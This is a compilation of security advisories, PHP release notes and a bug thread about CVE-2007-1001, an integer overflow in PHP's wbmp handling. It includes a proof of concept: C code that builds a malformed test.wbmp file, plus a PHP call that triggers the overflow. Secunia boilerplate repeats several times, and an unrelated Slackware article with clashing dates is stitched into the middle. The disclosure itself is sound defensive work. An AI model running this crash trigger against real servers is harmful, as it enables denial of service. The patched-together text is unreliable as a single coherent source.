How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

### PHP <= 5.2.1 wbmp file handling integer overflow

There is an integer overflow in PHP in ext/gd/libgd/wbmp.c in the function readwbmp. If large enough values are specified for wbmp image height and/or width, so that width\*height > 2^32, an integer overflow occurs on the following line

if ((wbmp->bitmap = (int \*) safe\_emalloc(wbmp->width \* wbmp->height, sizeof(int), 0)) == NULL)

causing the amount of memory allocated to be smaller than the amount of data to be read, subsequently causing buffer overflow (See the DoS PoC below).

Upon discovery, I first thought this to be a LibGD issue, however the file wbmp.c is changed in LibGD (as early as in version 2.0.33 released in 2004) and does not have this overflow.

As the only values written in memory upon exploiting this can be (int)0 and (int)1, exploiting this for anything other then DoS seems highly unlikely.

*Timeline*

Feb 14 2007 - Vulnerability discovered
Mar 7 2007 - Vendor contacted
Mar 7 2007 - Vendor responded, confirmed the bug and said they plan to fix it in PHP 5.2.2, which is to be released in April
Apr 7 2007 - Release of this advisory

Note: I was going to wait until the release of PHP 5.2.2 before publishing this, but seeing FrSIRT (and possibly others) already pubished it I am pushing the release forward a bit.

*References*

<http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-1001>
<http://www.frsirt.com/english/advisories/2007/1269>

*PoC*

#define BUFSIZE 1000000

#include <stdio.h>

int main()
{
int c;
char buf[BUFSIZE];

FILE \*fp = fopen("test.wbmp","w");

//write header
c = 0;
fputc(c,fp);
fputc(c,fp);

//write width = 2^32 / 4 + 1
c = 0x84;
fputc(c,fp);
c = 0x80;
fputc(c,fp);
fputc(c,fp);
fputc(c,fp);
c = 0x01;
fputc(c,fp);

//write height = 4
c = 0x04;
fputc(c,fp);

//write some data to cause overflow
fwrite(buf,sizeof(buf),1,fp);

fclose(fp);
}

<?php
$image = imagecreatefromwbmp('test.wbmp'); //overflow occurs
?>?

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

# PHP: Multiple vulnerabilities — GLSA **200705-19**

PHP contains several vulnerabilities including buffer and integer overflows
which could under certain conditions lead to the remote execution of
arbitrary code.

### Affected packages

| Package | **dev-lang/php** on all architectures |
| --- | --- |
| Affected versions | < **5.2.2** |
| Unaffected versions | revision >= **4.4.7**revision >= **4.4.8\_pre20070816**>= **5.2.2** |

### Background

PHP is a widely-used general-purpose scripting language that is
especially suited for Web development and can be embedded into HTML.

### Description

Several vulnerabilities were found in PHP, most of them during the
Month Of PHP Bugs (MOPB) by Stefan Esser. The most severe of these
vulnerabilities are integer overflows in wbmp.c from the GD library
(CVE-2007-1001) and in the substr\_compare() PHP 5 function
(CVE-2007-1375). Ilia Alshanetsky also reported a buffer overflow in
the make\_http\_soap\_request() and in the user\_filter\_factory\_create()
functions (CVE-2007-2510, CVE-2007-2511), and Stanislav Malyshev
discovered another buffer overflow in the bundled XMLRPC library
(CVE-2007-1864). Additionally, the session\_regenerate\_id() and the
array\_user\_key\_compare() functions contain a double-free vulnerability
(CVE-2007-1484, CVE-2007-1521). Finally, there exist implementation
errors in the Zend engine, in the mb\_parse\_str(), the unserialize() and
the mail() functions and other elements.

### Impact

Remote attackers might be able to exploit these issues in PHP
applications making use of the affected functions, potentially
resulting in the execution of arbitrary code, Denial of Service,
execution of scripted contents in the context of the affected site,
security bypass or information leak.

### Workaround

There is no known workaround at this time.

### Resolution

All PHP 5 users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=dev-lang/php-5.2.2"
```

All PHP 4 users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=dev-lang/php-4.4.7"
```

# PHP 5.2.2 Release Announcement

The PHP development team would like to announce the immediate availability of PHP 5.2.2.
This release continues to improve the security and the stability of the 5.X
branch and all users are strongly encouraged to upgrade to it as soon as possible.

**Security Enhancements and Fixes in PHP 5.2.2:**

* Fixed CVE-2007-1001, GD wbmp used with invalid image size (by Ivan Fratric)
* Fixed a header injection via Subject and To parameters to the mail() function (MOPB-34 by Stefan Esser)
* Fixed asciiz byte truncation inside mail() (MOPB-33 by Stefan Esser)
* Fixed wrong length calculation in unserialize S type (MOPB-29 by Stefan Esser)
* Fixed a bug in mb\_parse\_str() that can be used to activate register\_globals (MOPB-26 by Stefan Esser)
* Fixed unallocated memory access/double free in in array\_user\_key\_compare() (MOPB-24 by Stefan Esser)
* Fixed a double free inside session\_regenerate\_id() (MOPB-22 by Stefan Esser)
* Added missing open\_basedir & safe\_mode checks to zip:// and bzip:// wrappers. (MOPB-20, MOPB-21 by Stefan Esser).
* Fixed substr\_compare and substr\_count information leak (MOPB-14 by Stefan Esser) (Stas, Ilia)
* Limit nesting level of input variables with max\_input\_nesting\_level as fix for (MOPB-03 by Stefan Esser)
* Fixed CRLF injection inside ftp\_putcmd(). (by loveshell[at]Bug.Center.Team)
* Fixed a possible super-global overwrite inside import\_request\_variables(). (by Stefano Di Paola, Steffan Esser)
* Fixed a remotely trigger-able buffer overflow inside make\_http\_soap\_request(). (by Ilia Alshanetsky)
* Fixed a buffer overflow inside user\_filter\_factory\_create(). (by Ilia Alshanetsky)
* Fixed a remotely trigger-able buffer overflow inside bundled libxmlrpc library. (by Stanislav Malyshev)

While majority of the issues outlined above are local, in some circumstances given specific code paths they can be
triggered externally. Therefor, we strongly recommend that if you use code utilizing the functions and extensions identified as
having had vulnerabilities in them, you consider upgrading your PHP.

**The key improvements of PHP 5.2.2 include:**

* Further improvements to the Memory Manager with the goal of improving realloc() performance.
* Bundled GD, SQLite and PCRE libraries were upgraded.
* Additional methods were added to SPL's DirectoryIterator and SplFileInfo classes.
* Over 120 bug fixes.

For users upgrading from PHP 5.0 and PHP 5.1, an upgrade guide is available
[here](/UPDATE_5_2.txt), detailing the changes between those releases
and PHP 5.2.2.

For a full list of changes in PHP 5.2.2, see the [ChangeLog](/ChangeLog-5.php#5.2.2).

[View affected systems](https://console.redhat.com/insights/patch/advisories/RHSA-2007%3A0155)

## Topic

Updated PHP packages that fix several security issues are now available for
Red Hat Enterprise Linux 3 and 4.

This update has been rated as having important security impact by the Red
Hat Security Response Team.

## Description

PHP is an HTML-embedded scripting language commonly used with the Apache
HTTP Web server.

A denial of service flaw was found in the way PHP processed a deeply nested
array. A remote attacker could cause the PHP interpreter to crash by
submitting an input variable with a deeply nested array. (CVE-2007-1285)

A flaw was found in the way PHP's unserialize() function processed data. If
a remote attacker was able to pass arbitrary data to PHP's unserialize()
function, they could possibly execute arbitrary code as the apache user.
(CVE-2007-1286)

A flaw was found in the way the mbstring extension set global variables. A
script which used the mb\_parse\_str() function to set global variables could
be forced to enable the register\_globals configuration option, possibly
resulting in global variable injection. (CVE-2007-1583)

A double free flaw was found in PHP's session\_decode() function. If a
remote attacker was able to pass arbitrary data to PHP's session\_decode()
function, they could possibly execute arbitrary code as the apache user.
(CVE-2007-1711)

A flaw was discovered in the way PHP's mail() function processed header
data. If a script sent mail using a Subject header containing a string from
an untrusted source, a remote attacker could send bulk e-mail to unintended
recipients. (CVE-2007-1718)

A heap based buffer overflow flaw was discovered in PHP's gd extension. A
script that could be forced to process WBMP images from an untrusted source
could result in arbitrary code execution. (CVE-2007-1001)

A buffer over-read flaw was discovered in PHP's gd extension. A script that
could be forced to write arbitrary string using a JIS font from an
untrusted source could cause the PHP interpreter to crash. (CVE-2007-0455)

Users of PHP should upgrade to these updated packages which contain
backported patches to correct these issues.

## Solution

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

[Slackware](http://www.slackware.org/)

# Slackware

The story of Slackware is pretty darn interesting, when you start to dig a little deeper. Perhaps the most compelling element to the narrative is its longevity. Some twenty-five years after it was first released to the world, Slackware is indeed still going strong. It remains a preferred Linux distribution method by many. As of this writing, it is also still being updated at a decently steady pace.

If you’re just starting to learn about Linux distribution options, you will hear about Slackware a lot. There are several reasons as to why that is the case.

An Introduction To Slackware
In order to better appreciate the longevity of Slackware, we have to cover two major subjects. First, let’s take a quick at the history of Slackware. That begins in 1993, although work began on it even earlier than that. With this foundation, we can then move on to the benefits of Slackware. These are benefits that have remained consistent through the decades. They can go a long way towards explaining the appeal of Slackware in 2019.

As of this year, Slackware is the longest-standing Linux distribution choice that is still being updated.

A Brief History Of Slackware
Working from an even older Linux distribution known as Softlanding Linux, Patrick Volkerding created Slackware in 1993. It was released to the world at large in April of that year, and it has been well-regarded and updated ever since. One of the main purposes for the creation of Slackware in the first place was to establish the most Unix-like distribution option for Linux. Many believe they have succeeded in this regard time and time again.

Both stability and simplicity in design have always been the goals of Slackware. According to Scott Chow of [Theblogstarter.com](https://www.theblogstarter.com), Slackware continues to aspire to make as few changes as humanly possible to software packages that come from the upstream. Furthermore, it also tries to avoid anticipating use cases, or precluding the decisions of the user. There is nothing in the way of a graphical procedure for installation. You also won’t find automatic dependency resolutions for any given software package. It utilizes plain text files, and utilizes a small set of shell scripts, when it comes to configuration and administration. Booting it will take you to an environment of what can be described as a common-line interface.

Slackware has been updated a few times throughout the years. Volkerding continues to spearhead these updates, which is perhaps why Slackware has maintained such impressive consistency from 1993 to the present. The most recent update was released in June of 2016—just two years ago.

As we get ready for a more detailed look at the benefits of Slackware, let’s take a quick look at some of the main Slackware features you can expect.

Slackware Features
One of the great things about Slackware is that it covers a lot of different needs right out of the gate. It is designed in such a way that you should be able to start working with it pretty quickly, and that would be regardless of your level of experience.

We won’t cover every single Slackware feature here, but let’s unpack some of the top things to expect:

• X-Window Systems
• Developmental environments for both C and C++
• The ability to use Perl
• Various utilities related to networking
• A server for mail
• A server for the web
• A server for FTP-related needs
• GNU Image Manipulation capabilities

As you can see, Slackware brings a lot to the table from the beginning. That is certainly an impressive benefit unto itself, but there are so many other potential advantages of using Slackware to keep in mind.

Slackware Benefits Explained
Ultimately, it is obviously up to you to decide if Slackware is right for your needs. The great thing about Slackware is that you will know the answer to that almost immediately. Many find it to be a straightforward collection of features that they can engage immediately. Others see management and administration of Slackware as being riddled with tedious challenges and time-consuming requirements.

For now, let’s explore some of the most commonly-cited benefits of using Slackware for Linux:

• Stability: Even the people who find Slackware to be too challenging will tell you that it at least benefits from being enormously stable. Over the course of the past twenty-five years, Slackware has continued to function without a whole lot of problems. It has moved nicely with the times, but it really hasn’t changed all that much. Few things related to computers have such stability.
• Security: Even for Linux distributions, there are traps and pitfalls that need to be constantly kept in mind. By and large, Slackware doesn’t have that problem. It probably helps that new versions of Slackware do not come out until everything is absolutely ready.
• Neutral: Remember that Slackware isn’t dependent upon a package manager. This is largely due to the fact that the applications are installed through a source. Slackware is not affiliated with any company either. Distribution was community-driven in the early 90s, and Slackware remains committed to that a quarter of a century later.
• Speediness: Another thing to keep in mind with Slackware is that it will only install what you absolutely want. Because of this, and keeping in mind the release policy we mentioned above, Slackware tends to run the fastest of the Linux distributions.
• Clean configuration: One of the big knocks against Slackware is that it doesn’t have graphical config utilities. No matter what you want to do, you are going to need to use the command line. Some people find this frustrating, but others would argue that this gives you the cleanest possible config files to work with.
• Want to understand Linux: There are other benefits to Slackware, but this one might just be our favorite. Even if you initially think Slackware has a higher learning curve than other distributions, there is a strong argument to be made that it will be worth the extra effort. Some don’t even experience this extra effort. However, if you do, think about Linux in broader terms. If you need to have a comprehensive understanding of Linux, you really can’t ask for a better teacher than Slackware. When you’ve mastered everything there is to know about Slackware, you will have pretty much mastered using Linux, as well.

Conclusion
Slackbuilds and strong IT cred are two more benefits that are worth taking to heart. At the end of the day, nothing in the world of Linux distributions can exist without a certain measure of controversy and disagreement. People also tend to be fiercely passionate and loyal about their favorite distribution. Nonetheless, Slackware has a staying power that would be absurd to ignore. It has worked for an incredibly long time, and it has done so in a field that has little time or patience for things that can’t be intensely/comprehensively useful. You could certainly make the argument that it has done more for bringing people to the world of Linux than just about anything else.

Is Slackware right for you? At this point, you are in the best position possible to make that determination. As we mentioned before, Slackware is best experienced in a hands-on capacity. You can research the subject to death, and you still won’t really know for sure. The only thing we can promise you, as we mentioned before, is that you are going to be able to decide how you feel about Slackware pretty quickly. It could be one of the best decisions you have ever made, in terms of working with a distribution that helps you meet your goals.

# PHP 4.4.7 Release Announcement

The PHP development team would like to announce the immediate availability of
PHP 4.4.7. This release continues to improve the security and the stability of
the 4.4 branch and all users are strongly encouraged to upgrade to it as soon
as possible.

**Security Enhancements and Fixes in PHP 4.4.7:**

* Fixed CVE-2007-1001, GD wbmp used with invalid image size (by Ivan Fratric)
* Fixed asciiz byte truncation inside mail() (MOPB-33 by Stefan Esser)
* Fixed a bug in mb\_parse\_str() that can be used to activate register\_globals (MOPB-26 by Stefan Esser)
* Fixed unallocated memory access/double free in in array\_user\_key\_compare() (MOPB-24 by Stefan Esser)
* Fixed a double free inside session\_regenerate\_id() (MOPB-22 by Stefan Esser)
* Added missing open\_basedir & safe\_mode checks to zip:// and bzip:// wrappers. (MOPB-21 by Stefan Esser).
* Limit nesting level of input variables with max\_input\_nesting\_level as fix for (MOPB-03 by Stefan Esser)
* XSS in phpinfo() (MOPB-8 by Stefan Esser)
* Fixed CRLF injection inside ftp\_putcmd(). (by loveshell[at]Bug.Center.Team)
* Fixed a possible super-global overwrite inside import\_request\_variables(). (by Stefano Di Paola, Stefan Esser)
* Fixed a remotely trigger-able buffer overflow inside bundled libxmlrpc library. (by Stanislav Malyshev)

While majority of the issues outlined above are local, few issues such as the
XML-RPC overflows can be triggered remotely and therefor should be considered
critical. If you use the XML-RPC extension consider upgrading as soon as
possible.

**Other improvements of PHP 4.4.7 include:**

* About 10 bug fixes.

For a full list of changes in PHP 4.4.7, see the [ChangeLog](/ChangeLog-4.php#4.4.7).

| [Description](show_bug.cgi?id=235028#c0)  Joe Orton    2007-04-03 14:07:49 UTC  ``` Description of problem: An integer overflow exists in the wbmp handling in the copy of the gd library which is bundled in the "gd" extension:  <http://cvs.php.net/viewvc.cgi/php-src/ext/gd/libgd/gdhelpers.h?r1=1.2.2.3&r2=1.2.2.3.4.1&diff_format=u>   ```  [Comment 1](show_bug.cgi?id=235028#c1)  Joe Orton    2007-04-03 14:11:57 UTC  ``` Additionally, per [bug 224607](show_bug.cgi?id=224607 "CLOSED ERRATA - CVE-2007-0455 gd: buffer overrun"), Kees Cook from Ubuntu reported a "off-the-end-of-string increment", which could theoretically lead ot a buffer overflow.  This flaw would only be exploitable if a JIS-encoded font is used when processing a special malicious string.  (CVE-2007-0455; Impact: Low)    ```  [Comment 5](show_bug.cgi?id=235028#c5)  Red Hat Bugzilla    2007-04-16 15:33:39 UTC  ```  An advisory has been issued which should help the problem described in this bug report. This report is therefore being closed with a resolution of ERRATA. For more information on the solution and/or where to find the updated files, please follow the link below. You may reopen this bug report if the solution does not work for you.  <http://rhn.redhat.com/errata/RHSA-2007-0155.html>    ``` |  |

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.
